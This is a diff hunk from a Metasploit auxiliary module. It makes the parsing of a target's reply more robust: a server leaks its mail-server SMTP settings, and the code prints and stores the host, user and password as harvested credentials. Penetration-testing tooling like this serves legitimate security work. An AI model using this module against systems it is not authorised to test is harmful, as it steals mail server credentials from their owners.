@@ -94,26 +94,28 @@ class MetasploitModule < Msf::Auxiliary
     if res&.code == 200
       print_good('Mail server credentials retrieved:')
 
-      data = JSON.parse(res.body)
-      if data.key?('smtp') && data['smtp'].is_a?(Hash)
-        smtp_info = data['smtp']
+      if res.body && !res.body.empty?
+        data = JSON.parse(res.body)
+        if data.key?('smtp') && data['smtp'].is_a?(Hash)
+          smtp_info = data['smtp']
 
-        host = smtp_info.fetch('host', 'Unknown Host')
-        port = smtp_info.fetch('port', 'Unknown Port')
-        auth = smtp_info.fetch('auth', 'Unknown Auth')
-        user = smtp_info.fetch('user', 'Unknown User')
-        passw = smtp_info.fetch('pass', 'Unknown Password')
+          host = smtp_info.fetch('host', 'Unknown Host')
+          port = smtp_info.fetch('port', 'Unknown Port')
+          auth = smtp_info.fetch('auth', 'Unknown Auth')
+          user = smtp_info.fetch('user', 'Unknown User')
+          passw = smtp_info.fetch('pass', 'Unknown Password')
 
-        print_good("Host: #{host}")
-        print_good("Port: #{port}")
-        print_good("Auth Type: #{auth}")
-        print_good("User: #{user}")
-        print_good("Password: #{passw}")
+          print_good("Host: #{host}")
+          print_good("Port: #{port}")
+          print_good("Auth Type: #{auth}")
+          print_good("User: #{user}")
+          print_good("Password: #{passw}")
 
-        store_valid_credential(user: user, private: passw, proof: data.to_s)
-
+          store_valid_credential(user: user, private: passw, proof: data.to_s)
+        end
       else
         print_error('Unexpected or no reply received.')
+        print_status(res.body)
       end
     end
   end
